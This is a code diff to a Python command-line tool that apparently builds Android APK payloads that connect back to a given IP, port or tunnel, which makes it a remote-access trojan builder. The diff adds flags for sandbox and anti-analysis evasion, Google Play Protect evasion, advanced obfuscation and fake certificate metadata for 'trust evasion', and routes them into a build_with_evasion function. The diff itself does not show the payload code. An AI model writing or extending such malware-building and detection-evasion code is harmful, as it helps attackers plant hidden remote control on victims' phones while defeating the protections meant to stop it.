@@ -40,6 +40,10 @@ parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter t
 parser.add_argument('-icon','--icon',help='Visible Icon',action='store_true')
 parser.add_argument('--stealth',help='Enable maximum stealth mode with detection evasion',action='store_true')
 parser.add_argument('--random-package',help='Use random package name for evasion',action='store_true')
+parser.add_argument('--anti-analysis',help='Enable advanced anti-analysis and sandbox evasion',action='store_true')
+parser.add_argument('--play-protect-evasion',help='Enable Play Protect specific evasion techniques',action='store_true')
+parser.add_argument('--advanced-obfuscation',help='Apply advanced string and code obfuscation',action='store_true')
+parser.add_argument('--fake-certificates',help='Use fake certificate metadata for trust evasion',action='store_true')
 args = parser.parse_args()
 
 
@@ -75,7 +79,14 @@ if args.build:
         if tunnel_result:
             ip, tunnel_port, tunnel_url = tunnel_result
             print(stdOutput("success")+"\033[1mTunnel established successfully!")
-            build(ip, tunnel_port, args.output, True, port_, icon)
+            build_with_evasion(ip, tunnel_port, args.output, True, port_, icon, {
+                'stealth': args.stealth,
+                'random_package': args.random_package,
+                'anti_analysis': getattr(args, 'anti_analysis', False),
+                'play_protect_evasion': getattr(args, 'play_protect_evasion', False), 
+                'advanced_obfuscation': getattr(args, 'advanced_obfuscation', False),
+                'fake_certificates': getattr(args, 'fake_certificates', False)
+            })
             
             # Keep tunnel alive during shell if requested
             if tunnel_manager:
@@ -90,7 +101,17 @@ if args.build:
             sys.exit()
     else:
         if args.ip and args.port:
-            build(args.ip,port_,args.output,False,None,icon)
+            # Create evasion options dictionary
+            evasion_options = {
+                'stealth': args.stealth,
+                'random_package': args.random_package,
+                'anti_analysis': args.anti_analysis if hasattr(args, 'anti_analysis') else False,
+                'play_protect_evasion': args.play_protect_evasion if hasattr(args, 'play_protect_evasion') else False,
+                'advanced_obfuscation': args.advanced_obfuscation if hasattr(args, 'advanced_obfuscation') else False,
+                'fake_certificates': args.fake_certificates if hasattr(args, 'fake_certificates') else False
+            }
+            
+            build_with_evasion(args.ip, port_, args.output, False, None, icon, evasion_options)
         else:
             print(stdOutput("error")+"\033[1mArguments Missing")
             print(stdOutput("info")+"\033[1mUse --tunnel for automatic tunneling, or provide -i and -p")
